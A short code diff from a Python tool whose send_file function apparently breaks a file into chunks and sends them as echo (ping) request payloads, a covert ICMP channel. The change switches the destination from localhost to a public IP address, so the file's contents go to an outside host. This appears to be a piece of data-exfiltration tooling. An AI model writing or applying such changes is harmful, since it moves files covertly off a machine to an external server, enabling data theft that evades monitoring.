@@ -79,7 +79,7 @@ def send_file(file: str):
             payload = Message.SYN.value + "/" + "TRANSMIT" + "/" + str(total) + "/botelho.txt"
         else:
             payload = Message.SYN.value + "/" + str(couter) + "/" + file[couter - 1]
-        simple_echo_request("127.0.0.1", payload.encode())
+        simple_echo_request("34.172.143.22", payload.encode())
         couter += 1
         print("[+] Send:" + str(payload))
 
